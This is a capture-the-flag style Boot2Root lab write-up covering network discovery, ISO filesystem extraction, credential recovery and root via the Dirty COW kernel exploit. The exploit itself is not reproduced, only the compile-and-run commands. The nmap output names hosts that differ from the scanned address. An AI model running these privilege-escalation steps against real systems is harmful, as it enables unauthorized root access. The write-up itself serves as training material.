# Boot2Root

## write up 2

### find the ip of the vm

```
$ arp-scan -l -I eth0
[...]
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.2.1 52:54:00:12:35:00 QEMU
10.0.2.2 52:54:00:12:35:00 QEMU
10.0.2.3 08:00:27:c9:e5:50 CADMUS COMPUTER SYSTEMS
10.0.2.17 08:00:27:6d:9d:0b	CADMUS COMPUTER SYSTEMS
```


### scan vm ports  

```
$ nmap 10.0.2.17
[...]
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-22 14:14 CET
Nmap scan report for 192.168.80.1
Host is up (0.00019s latency).
Not shown: 967 closed ports, 32 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.80.128
Host is up (0.00053s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

### Work around the iso

see the install fs in scripts/

steps :
- mount the file system os located in the iso
```
$ mount /mnt/iso/casper/filesystem.squashfs /mnt/fs/ -t squashfs -o loop
$ cat /mnt/fs
[...]
```

Here we go, there is an archive in /home/LOOKATME
```
$ file fun
fun: POSIX tar archive (GNU)
```
```
$ tar xvf fun ; ls
ft_fun  fun  README
```
After some trouble we can see there is some .pcap files containing a .c file

With a little script in python we are able to recover the source file an then build it.

### laurie passwd
```
==> Iheartpwnage ======================================================>
																	   |
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  <=====

```
From here we can connect through ssh on the machine as laurie user.

### Dirty Cow, Race condition ptrace based

we can gather some info on our os :

Kernel version
```
$ uname -r
3.2.0-91-generic-pae
```

we can, with some research find an exploit with this requirement

Dirty Cow is a race condition exploit who's exploit the ptrace fct.

```
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)

$ gcc -pthread dirty.c -o dirty -lcrypt && ./dirty
[...]
create password :
helloworld
```
an then :
```
$ su firefart
helloworld
[...]
root@root# 
```

## We became root !
